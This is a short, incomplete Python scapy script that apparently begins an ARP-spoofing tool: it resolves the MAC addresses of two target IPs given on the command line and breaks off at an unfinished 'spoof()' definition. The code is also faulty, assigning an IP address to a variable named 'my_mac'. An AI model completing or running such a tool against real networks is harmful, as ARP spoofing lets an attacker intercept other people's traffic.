import sys
import threading
from scapy.all import *

conf.iface = "eth1"

def get_mac(IP1):
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP1)
    res, _ = srp(arp_request, timeout=2, verbose=False)
    for sent, recive in res:
        return recive.hwsrc
    return None

target1_IP = sys.argv[1]
target1_MAC = get_mac(target1_IP)
target2_IP = sys.argv[2]
target2_MAC = get_mac(target2_IP)
my_mac = get_if_addr(conf.iface)


def spoof()